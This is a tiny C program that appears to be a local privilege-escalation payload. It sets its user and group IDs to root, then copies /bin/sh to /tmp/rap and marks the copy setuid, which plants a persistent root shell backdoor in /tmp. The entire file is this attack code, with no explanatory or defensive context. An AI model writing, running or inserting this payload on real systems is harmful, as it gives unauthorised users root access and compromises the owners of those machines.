#include <stdio.h>
#include <unistd.h>
int main(void) {
  setuid(0);
  setgid(0);
  seteuid(0);
  setegid(0);
  system("cp /bin/sh /tmp/rap;chmod u+s /tmp/rap;id");
}
